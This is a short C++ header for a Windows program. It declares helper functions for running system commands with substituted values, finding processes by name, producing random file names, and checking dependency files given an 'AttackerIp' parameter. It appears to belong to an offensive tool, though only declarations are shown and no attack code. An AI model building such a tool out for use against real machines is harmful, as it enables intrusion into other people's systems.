#pragma once
#include <iostream>
#include <Windows.h>
#include <random>
#include <Psapi.h>

typedef struct _REPLACEMENT {
	char* Replace;
	char WhereTo;
	int RepCount;
} REPLACEMENT, * PREPLACEMENT;

int CharpToWcharp(const char* ConvertString, WCHAR* ConvertedString);
int WcharpToCharp(char* ConvertString, const WCHAR* ConvertedString);
std::wstring GetCurrentPath();
int CountOccurrences(const char* SearchStr, char SearchLetter);
int ShowMessage(int Type, const char* Title, const char* Text);
void GetServiceName(char* Path, char* Buffer);
void ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, int Size);
DWORD ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size);
void GetRandomName(char* NameBuf, DWORD RandSize, const char* Extension);
int GetPidByName(const char* Name);
int CheckLetterInArr(char Chr, const char* Arr);
BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount);
int VerfifyDepDirs();
int VerfifyDepFiles(const char* AttackerIp);